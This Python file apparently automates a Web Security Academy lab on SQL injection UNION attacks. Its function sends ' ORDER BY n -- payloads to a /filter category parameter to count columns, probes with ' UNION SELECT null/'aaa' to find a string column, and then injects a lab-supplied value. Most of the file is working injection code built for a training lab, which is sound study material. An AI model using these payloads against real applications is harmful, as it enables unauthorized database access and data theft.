from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    logger.info("Extracting string value provided by lab...")
    resp = session.get_path("/")
    soup = BeautifulSoup(resp.text, "lxml")
    hint = soup.select_one("#hint").text

    value = re.match(r"Make the database retrieve the string: '([^']+)'", hint).group(1)
    logger.success(f"Provided string value: {value}")

    path = "/filter"
    logger.info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} --"}
        resp = session.get_path(path, params=params)
        logger.info(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1

    logger.success(f"There are {num_columns} columns.")
    logger.info("Finding a column with the string data type...")

    i = 0
    while i < num_columns:
        columns = ["null"] * num_columns
        columns[i] = "'aaa'"
        columns = ", ".join(columns)

        params = {"category": f"' UNION SELECT {columns} -- //"}
        resp = session.get_path(path, params=params)
        logger.info(f"{params} => {resp.status_code}")
        if resp.status_code == 200:
            break
        else:
            i += 1

    if i == num_columns:
        logger.failure("Unable to find a column with the string data type")
        return
    else:
        logger.success(f"Column {i} has the string data type.")

    # Construct columns string
    columns = ["null"] * num_columns
    columns[i] = f"'{value}'"
    columns = ", ".join(columns)
    params = {"category": f"' UNION SELECT {columns} --"}

    logger.info(
        f'Performing SQL injection UNION attack by visiting "{path}" with the following parameters:'
    )
    logger.info(params)

    session.get_path(path, params=params)
    logger.success("SQL injection UNION attack performed.")
